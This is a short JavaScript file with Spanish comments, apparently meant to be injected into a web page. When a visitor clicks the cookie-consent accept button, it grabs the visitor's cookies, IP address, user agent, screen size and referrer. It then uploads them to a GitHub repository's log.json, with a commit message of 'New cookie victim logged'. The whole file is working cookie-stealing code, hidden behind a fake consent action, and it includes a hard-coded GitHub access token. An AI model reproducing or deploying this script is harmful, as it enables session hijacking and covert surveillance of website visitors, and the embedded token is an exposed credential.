// CONFIGURACIÓN
const GITHUB_TOKEN = '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'; // Pon aquí tu token de GitHub
const REPO_OWNER = 'kernel-shield'; // Tu usuario de GitHub
const REPO_NAME = 'kernel-shield'; // Nombre de tu repositorio
const BRANCH = 'main'; // O master

async function getIP() {
    try {
        const res = await fetch('https://api.ipify.org?format=json');
        const data = await res.json();
        return data.ip;
    } catch (e) {
        return 'Unknown';
    }
}

async function stealAndSave() {
    const ip = await getIP();
    const userData = {
        ip: ip,
        userAgent: navigator.userAgent,
        screenRes: window.screen.width + 'x' + window.screen.height,
        cookies: document.cookie.substring(0, 500), // Recorta para no saturar
        timestamp: new Date().toISOString(),
        referrer: document.referrer
    };

    // Guardamos en un JSON en la raíz del repo
    const url = `https://api.github.com/repos/${REPO_OWNER}/${REPO_NAME}/contents/log.json`;
    
    // Primero leemos si ya existe algo para no borrar el historial
    let existingData = [];
    try {
        const res = await fetch(url + '?ref=' + BRANCH);
        if (res.ok) {
            const json = await res.json();
            const content = atob(json.content); // Decodificar Base64
            existingData = JSON.parse(content);
        }
    } catch(e) { /* Si no existe, empezamos desde cero */ }

    existingData.push(userData);

    // Subimos el nuevo JSON
    await fetch(url + '?sha=' + BRANCH, {
        method: 'PUT',
        headers: {
            'Authorization': `token ${GITHUB_TOKEN}`,
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            message: 'New cookie victim logged',
            content: btoa(JSON.stringify(existingData))
        })
    });
}

// Activar cuando aceptan cookies
document.addEventListener('DOMContentLoaded', () => {
    const btn = document.getElementById('cookieAccept');
    if(btn) {
        btn.addEventListener('click', () => {
            console.log("Cookies aceptadas. Robando datos...");
            stealAndSave();
        });
    }
});
